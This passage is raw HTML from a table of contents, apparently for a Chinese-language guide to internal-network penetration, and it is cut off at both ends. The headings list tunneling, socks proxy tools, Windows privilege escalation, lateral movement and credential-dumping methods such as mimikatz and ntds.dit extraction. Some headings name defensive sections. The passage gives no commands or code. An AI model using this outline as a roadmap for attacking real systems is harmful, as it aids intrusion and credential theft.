class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C"><span class="toc-article-text">文件操作</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E7%BD%91%E7%BB%9C%E6%93%8D%E4%BD%9C"><span class="toc-article-text">网络操作</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-article-text">端口转发</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#NAT%E6%98%A0%E5%B0%84"><span class="toc-article-text">NAT映射</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#5%E3%80%81%E5%BA%94%E7%94%A8%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF"><span class="toc-article-text">5、应用层隧道技术</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#SSH%E5%8D%8F%E8%AE%AE"><span class="toc-article-text">SSH协议</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E6%9C%AC%E5%9C%B0%E8%BD%AC%E5%8F%91"><span class="toc-article-text">本地转发</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E8%BF%9C%E7%A8%8B%E8%BD%AC%E5%8F%91"><span class="toc-article-text">远程转发</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E5%8A%A8%E6%80%81%E8%BD%AC%E5%8F%91"><span class="toc-article-text">动态转发</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#SSH-%E9%9A%A7%E9%81%93%E6%94%BB%E5%87%BB%E7%9A%84%E9%98%B2%E5%BE%A1"><span class="toc-article-text">SSH 隧道攻击的防御</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#HTTP-HTTPS%E5%8D%8F%E8%AE%AE"><span class="toc-article-text">HTTP&#x2F;HTTPS协议</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#DNS%E5%8D%8F%E8%AE%AE"><span class="toc-article-text">DNS协议</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#DNS%E8%BF%AD%E4%BB%A3%E6%9F%A5%E8%AF%A2"><span class="toc-article-text">DNS迭代查询</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#DNS%E8%AE%B0%E5%BD%95"><span class="toc-article-text">DNS记录</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84DNS%E9%9A%A7%E9%81%93%E5%B7%A5%E5%85%B7"><span class="toc-article-text">常见的DNS隧道工具</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E6%9F%A5%E7%9C%8BDNS%E7%9A%84%E8%BF%9E%E9%80%9A%E6%80%A7"><span class="toc-article-text">查看DNS的连通性</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#dnscat2"><span class="toc-article-text">dnscat2</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#dnscat2%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%AE%89%E8%A3%85"><span class="toc-article-text">dnscat2服务端安装</span></a></li><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#dnscat2%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%AE%89%E8%A3%85"><span class="toc-article-text">dnscat2客户端安装</span></a></li><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#dnscat2%E4%BD%BF%E7%94%A8"><span class="toc-article-text">dnscat2使用</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-6"><a class="toc-article-link" href="#%E7%9B%B4%E8%BF%9E%E6%A8%A1%E5%BC%8F"><span class="toc-article-text">直连模式</span></a></li><li class="toc-article-item toc-article-level-6"><a class="toc-article-link" href="#%E4%B8%AD%E7%BB%A7%E6%A8%A1%E5%BC%8F"><span class="toc-article-text">中继模式</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#iodine"><span class="toc-article-text">iodine</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#iodine%E5%AE%89%E8%A3%85"><span class="toc-article-text">iodine安装</span></a></li><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#iodine%E4%BD%BF%E7%94%A8"><span class="toc-article-text">iodine使用</span></a></li></ol></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E9%98%B2%E5%BE%A1DNS%E9%9A%A7%E9%81%93%E6%94%BB%E5%87%BB%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-article-text">防御DNS隧道攻击的方法</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#6%E3%80%81socks%E4%BB%A3%E7%90%86"><span class="toc-article-text">6、socks代理</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#ew"><span class="toc-article-text">ew</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E6%AD%A3%E5%90%91%E8%BF%9E%E6%8E%A5"><span class="toc-article-text">正向连接</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E5%8F%8D%E5%90%91%E8%BF%9E%E6%8E%A5"><span class="toc-article-text">反向连接</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E4%BD%9C%E4%B8%BA%E4%BA%8C%E7%BA%A7%E8%B7%B3%E6%9D%BF%E4%BD%BF%E7%94%A8-%E4%BA%8C%E7%BA%A7%E7%BD%91%E7%BB%9C%E7%8E%AF%E5%A2%83-1"><span class="toc-article-text">作为二级跳板使用(二级网络环境)1</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E4%BD%9C%E4%B8%BA%E4%BA%8C%E7%BA%A7%E8%B7%B3%E6%9D%BF%E4%BD%BF%E7%94%A8-%E4%BA%8C%E7%BA%A7%E7%BD%91%E7%BB%9C%E7%8E%AF%E5%A2%83-2"><span class="toc-article-text">作为二级跳板使用(二级网络环境)2</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E4%BD%9C%E4%B8%BA%E4%B8%89%E7%BA%A7%E8%B7%B3%E6%9D%BF%E4%BD%BF%E7%94%A8"><span class="toc-article-text">作为三级跳板使用</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#iox-%E7%AE%80%E5%8D%95%E6%98%93%E7%94%A8%E4%BD%93%E7%A7%AF%E5%B0%8F"><span class="toc-article-text">iox(简单易用体积小)</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91-2"><span class="toc-article-text">端口转发</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E5%86%85%E7%BD%91%E5%AE%9E%E7%8E%B0socks%E4%BB%A3%E7%90%86"><span class="toc-article-text">内网实现socks代理</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E5%90%AF%E7%94%A8%E5%8A%A0%E5%AF%86"><span class="toc-article-text">启用加密</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#frp-%E6%8E%A8%E8%8D%90"><span class="toc-article-text">frp(推荐)</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E5%86%85%E7%BD%91%E7%AB%AF%E5%8F%A3%E7%A9%BF%E9%80%8F"><span class="toc-article-text">内网端口穿透</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E5%BB%BA%E7%AB%8B-socks-%E4%BB%A3%E7%90%86"><span class="toc-article-text">建立 socks 代理</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#nps-%E6%8E%A8%E8%8D%90"><span class="toc-article-text">nps(推荐)</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E5%BB%BA%E7%AB%8B-socks-%E4%BB%A3%E7%90%86-2"><span class="toc-article-text">建立 socks 代理</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#7%E3%80%81%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%8E%E4%B8%8B%E8%BD%BD"><span class="toc-article-text">7、文件上传与下载</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%8E%E4%B8%8B%E8%BD%BD%E6%89%8B%E6%B3%95"><span class="toc-article-text">常见文件上传与下载手法</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E7%AA%81%E7%A0%B4%E5%86%85%E7%BD%91%E7%A6%81%E6%AD%A2%E4%B8%8A%E4%BC%A0%E5%A4%A7%E6%96%87%E4%BB%B6"><span class="toc-article-text">突破内网禁止上传大文件</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E5%8E%8B%E7%BC%A9%E6%96%87%E4%BB%B6"><span class="toc-article-text">压缩文件</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E5%88%86%E5%89%B2%E6%96%87%E4%BB%B6"><span class="toc-article-text">分割文件</span></a></li></ol></li></ol></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link"><span class="toc-article-text">权限提升分析及防御</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E5%8F%91%E7%8E%B0%E4%B8%BB%E6%9C%BA%E7%BC%BA%E5%A4%B1%E8%A1%A5%E4%B8%81"><span class="toc-article-text">发现主机缺失补丁</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E6%89%8B%E5%B7%A5%E5%8F%91%E7%8E%B0%E7%BC%BA%E5%A4%B1%E8%A1%A5%E4%B8%81"><span class="toc-article-text">手工发现缺失补丁</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E8%87%AA%E5%8A%A8%E5%8F%91%E7%8E%B0%E7%BC%BA%E5%A4%B1%E8%A1%A5%E4%B8%81"><span class="toc-article-text">自动发现缺失补丁</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#Sherlock-%E8%84%9A%E6%9C%AC"><span class="toc-article-text">Sherlock 脚本</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#Metasploit"><span class="toc-article-text">Metasploit</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#wesng"><span class="toc-article-text">wesng</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E5%88%A9%E7%94%A8"><span class="toc-article-text">系统服务权限配置不当利用</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%8F%AF%E4%BF%A1%E4%BB%BB%E6%9C%8D%E5%8A%A1%E8%B7%AF%E5%BE%84%E6%BC%8F%E6%B4%9E"><span class="toc-article-text">可信任服务路径漏洞</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E6%B3%A8%E5%86%8C%E8%A1%A8%E9%94%AEAlwaysInstallElevated"><span class="toc-article-text">注册表键AlwaysInstallElevated</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E4%BD%BF%E7%94%A8PowerUp%E8%BF%9B%E8%A1%8C%E5%88%A9%E7%94%A8"><span class="toc-article-text">使用PowerUp进行利用</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E4%BD%BF%E7%94%A8MSF%E8%BF%9B%E8%A1%8C%E5%88%A9%E7%94%A8"><span class="toc-article-text">使用MSF进行利用</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E4%BD%BF%E7%94%A8MSI-Wrapper%E8%BF%9B%E8%A1%8C%E5%88%A9%E7%94%A8"><span class="toc-article-text">使用MSI Wrapper进行利用</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%88%A9%E7%94%A8"><span class="toc-article-text">计划任务利用</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E4%BD%BF%E7%94%A8AccessChk%E6%A3%80%E6%9F%A5%E7%9B%AE%E5%BD%95%E6%9D%83%E9%99%90"><span class="toc-article-text">使用AccessChk检查目录权限</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E4%BD%BF%E7%94%A8icacls%E6%A3%80%E6%9F%A5%E7%9B%AE%E5%BD%95%E6%9D%83%E9%99%90"><span class="toc-article-text">使用icacls检查目录权限</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-article-text">配置文件信息泄露</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#PowerUp"><span class="toc-article-text">PowerUp</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Metasploit-2"><span class="toc-article-text">Metasploit</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Empire-2"><span class="toc-article-text">Empire</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E7%BB%84%E7%AD%96%E7%95%A5%E9%A6%96%E9%80%89%E9%A1%B9%E6%8F%90%E6%9D%83%E5%88%A9%E7%94%A8"><span class="toc-article-text">组策略首选项提权利用</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#1-%E6%9F%A5%E6%89%BE%E5%8C%85%E5%90%ABcpassword%E7%9A%84XML%E6%96%87%E4%BB%B6"><span class="toc-article-text">1.查找包含cpassword的XML文件</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#2-%E8%A7%A3%E5%AF%86cpassword%E5%AF%86%E6%96%87"><span class="toc-article-text">2.解密cpassword密文</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E7%BB%84%E7%AD%96%E7%95%A5%E9%A6%96%E9%80%89%E9%A1%B9%E6%8F%90%E6%9D%83%E7%9A%84%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD"><span class="toc-article-text">组策略首选项提权的防御措施</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E7%BB%95%E8%BF%87UAC%E6%8F%90%E6%9D%83%E5%88%A9%E7%94%A8-bypassUAC"><span class="toc-article-text">绕过UAC提权利用(bypassUAC)</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E4%BD%BF%E7%94%A8MSF%E7%BB%95%E8%BF%87UAC%E8%BF%9B%E8%A1%8C%E6%8F%90%E6%9D%83"><span class="toc-article-text">使用MSF绕过UAC进行提权</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E4%BD%BF%E7%94%A8Nishang%E4%B8%AD%E7%9A%84Invoke-PsUACme%E6%A8%A1%E5%9D%97%E7%BB%95%E8%BF%87"><span class="toc-article-text">使用Nishang中的Invoke-PsUACme模块绕过</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Win10-Bypass-UAC"><span class="toc-article-text">Win10 Bypass UAC</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E4%BD%BF%E7%94%A8Empire%E4%B8%AD%E7%9A%84%E6%A8%A1%E5%9D%97%E7%BB%95%E8%BF%87"><span class="toc-article-text">使用Empire中的模块绕过</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E9%92%88%E5%AF%B9%E7%BB%95%E8%BF%87UAC%E6%8F%90%E6%9D%83%E7%9A%84%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD"><span class="toc-article-text">针对绕过UAC提权的防御措施</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96"><span class="toc-article-text">令牌窃取</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E4%BD%BF%E7%94%A8MSF%E7%AA%83%E5%8F%96%E4%BB%A4%E7%89%8C"><span class="toc-article-text">使用MSF窃取令牌</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E4%BD%BF%E7%94%A8Rotten-Potato%E7%AA%83%E5%8F%96%E4%BB%A4%E7%89%8C"><span class="toc-article-text">使用Rotten Potato窃取令牌</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E6%B7%BB%E5%8A%A0%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98"><span class="toc-article-text">添加域管理员</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Empire%E4%B8%8B%E7%9A%84%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96"><span class="toc-article-text">Empire下的令牌窃取</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E9%92%88%E5%AF%B9%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96%E6%8F%90%E6%9D%83%E7%9A%84%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90"><span class="toc-article-text">针对令牌窃取提权的防御分析</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%97%A0%E5%87%AD%E8%AF%81%E6%9D%A1%E4%BB%B6%E4%B8%8B%E7%9A%84%E6%9D%83%E9%99%90"><span class="toc-article-text">无凭证条件下的权限</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#LLMNR-%E5%92%8C-NetBIOS-%E6%AC%BA%E9%AA%97%E6%94%BB%E5%87%BB%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5"><span class="toc-article-text">LLMNR 和 NetBIOS 欺骗攻击的基本概念</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#LLMNR"><span class="toc-article-text">LLMNR</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#NetBIOS"><span class="toc-article-text">NetBIOS</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#Net-NTLM-Hash"><span class="toc-article-text">Net-NTLM Hash</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E5%9C%A8LLMNR%E5%92%8CNetBIOS%E5%85%B1%E5%90%8C%E4%BD%9C%E7%94%A8%E4%B8%8B%E7%9A%84%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E6%AD%A5%E9%AA%A4"><span class="toc-article-text">在LLMNR和NetBIOS共同作用下的名称解析步骤</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#LLMNR%E5%92%8CNetBIOS%E5%88%A9%E7%94%A8"><span class="toc-article-text">LLMNR和NetBIOS利用</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link"><span class="toc-article-text">域内横向移动</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#IPC"><span class="toc-article-text">IPC</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#IPC%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-article-text">IPC利用条件</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#IPC%E8%BF%9E%E6%8E%A5%E5%A4%B1%E8%B4%A5%E5%8E%9F%E5%9B%A0"><span class="toc-article-text">IPC连接失败原因</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#IPC%E8%BF%9E%E6%8E%A5%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF"><span class="toc-article-text">IPC连接常见错误</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#IPC%E9%85%8D%E5%90%88%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-article-text">IPC配合系统服务横向移动</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="toc-article-text">计划任务</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#at"><span class="toc-article-text">at</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#schtasks"><span class="toc-article-text">schtasks</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Windows%E7%B3%BB%E7%BB%9F%E6%95%A3%E5%88%97%E5%80%BC-%E5%93%88%E5%B8%8C-%E8%8E%B7%E5%8F%96"><span class="toc-article-text">Windows系统散列值(哈希)获取</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#GetPass"><span class="toc-article-text">GetPass</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#PwDump7"><span class="toc-article-text">PwDump7</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#QuarkPwDump"><span class="toc-article-text">QuarkPwDump</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Get-PassHashes"><span class="toc-article-text">Get-PassHashes</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#mimikatz"><span class="toc-article-text">mimikatz</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E9%80%9A%E8%BF%87SAM%E5%92%8CSystem%E6%96%87%E4%BB%B6%E6%8A%93%E5%8F%96%E5%AF%86%E7%A0%81"><span class="toc-article-text">通过SAM和System文件抓取密码</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E5%AF%BC%E5%87%BASAM%E5%92%8CSystem%E6%96%87%E4%BB%B6"><span class="toc-article-text">导出SAM和System文件</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E8%AF%BB%E5%8F%96SAM%E5%92%8CSystem%E6%96%87%E4%BB%B6%E8%8E%B7%E5%8F%96NTML-Hash"><span class="toc-article-text">读取SAM和System文件获取NTML Hash</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#%E4%BD%BF%E7%94%A8mimikatz%E8%AF%BB%E5%8F%96SAM%E5%92%8CSystem%E6%96%87%E4%BB%B6"><span class="toc-article-text">使用mimikatz读取SAM和System文件</span></a></li><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#%E4%BD%BF%E7%94%A8Cain%E8%AF%BB%E5%8F%96SAM%E5%92%8CSystem%E6%96%87%E4%BB%B6"><span class="toc-article-text">使用Cain读取SAM和System文件</span></a></li><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#%E4%BD%BF%E7%94%A8SAMInside%E8%AF%BB%E5%8F%96SAM%E5%92%8CSystem%E6%96%87%E4%BB%B6"><span class="toc-article-text">使用SAMInside读取SAM和System文件</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E9%80%9A%E8%BF%87lsass-dmp%E6%96%87%E4%BB%B6%E6%8A%93%E5%8F%96%E5%AF%86%E7%A0%81"><span class="toc-article-text">通过lsass.dmp文件抓取密码</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E5%AF%BC%E5%87%BAlsass-dmp%E6%96%87%E4%BB%B6"><span class="toc-article-text">导出lsass.dmp文件</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E8%AF%BB%E5%8F%96lsass-dmp%E6%96%87%E4%BB%B6"><span class="toc-article-text">读取lsass.dmp文件</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#%E4%BD%BF%E7%94%A8mimikatz%E8%AF%BB%E5%8F%96lsass-dmp%E6%96%87%E4%BB%B6"><span class="toc-article-text">使用mimikatz读取lsass.dmp文件</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E9%80%9A%E8%BF%87ntds-dit%E6%96%87%E4%BB%B6%E6%8A%93%E5%8F%96%E5%AF%86%E7%A0%81"><span class="toc-article-text">通过ntds.dit文件抓取密码</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E5%AF%BC%E5%87%BAntds-dit%E6%96%87%E4%BB%B6"><span class="toc-article-text">导出ntds.dit文件</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9A%E4%BD%BF%E7%94%A8Ntdsutil"><span class="toc-article-text">方法一：使用Ntdsutil</span></a></li><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%9A%E4%BD%BF%E7%94%A8vssadmin"><span class="toc-article-text">方法二：使用vssadmin</span></a></li><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#%E6%96%B9%E6%B3%95%E4%B8%89%EF%BC%9A%E4%BD%BF%E7%94%A8NinjaCopy-%E8%84%9A%E6%9C%AC"><span class="toc-article-text">方法三：使用NinjaCopy 脚本</span></a></li><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#%E6%96%B9%E6%B3%95%E5%9B%9B%EF%BC%9A%E4%BD%BF%E7%94%A8nishang%E4%B8%AD%E7%9A%84Copy-VSS%E8%84%9A%E6%9C%AC"><span class="toc-article-text">方法四：使用nishang中的Copy-VSS脚本</span></a></li><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#%E6%96%B9%E6%B3%95%E4%BA%94%EF%BC%9A%E4%BD%BF%E7%94%A8-vssown-vbs-%E8%84%9A%E6%9C%AC"><span class="toc-article-text">方法五：使用 vssown.vbs 脚本</span></a></li><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#%E6%96%B9%E6%B3%95%E5%85%AD%EF%BC%9A%E4%BD%BF%E7%94%A8-diskshadow"><span class="toc-article-text">方法六：使用 diskshadow</span></a></li><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#%E6%96%B9%E6%B3%95%E4%B8%83%EF%BC%9A%E4%BD%BF%E7%94%A8msf"><span class="toc-article-text">方法七：使用msf</span></a></li><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#%E6%96%B9%E6%B3%95%E5%85%AB%EF%BC%9A%E4%BD%BF%E7%94%A8vshadow%E9%85%8D%E5%90%88ShadowCopy-bat%E8%84%9A%E6%9C%AC"><span class="toc-article-text">方法八：使用vshadow配合ShadowCopy.bat脚本</span></a></li><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#%E5%8D%B7%E5%BD%B1%E6%8B%B7%E8%B4%9D%E6%9C%8D%E5%8A%A1%E7%9A%84%E9%98%B2%E5%BE%A1"><span class="toc-article-text">卷影拷贝服务的防御</span></a></li></ol></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E8%AF%BB%E5%8F%96ntds-dit%E6%96%87%E4%BB%B6"><span class="toc-article-text">读取ntds.dit文件</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9A%E4%BD%BF%E7%94%A8NTDSDumpEx%E8%AF%BB%E5%8F%96ntds-dit%E6%96%87%E4%BB%B6"><span class="toc-article-text">方法一：使用NTDSDumpEx读取ntds.dit文件</span></a></li><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%9A%E4%BD%BF%E7%94%A8impacket%E9%87%8C%E7%9A%84secretsdump-py%E8%84%9A%E6%9C%AC%E8%AF%BB%E5%8F%96ntds-dit%E6%96%87%E4%BB%B6"><span class="toc-article-text">方法二：使用impacket里的secretsdump.py脚本读取ntds.dit文件</span></a></li><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#%E6%96%B9%E6%B3%95%E4%B8%89%EF%BC%9A%E5%88%A9%E7%94%A8mimikatz%E7%9B%B4%E6%8E%A5%E8%AF%BB%E5%8F%96-ntds-dit-%E6%96%87%E4%BB%B6"><span class="toc-article-text">方法三：利用mimikatz直接读取 ntds.dit 文件</span></a></li><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" 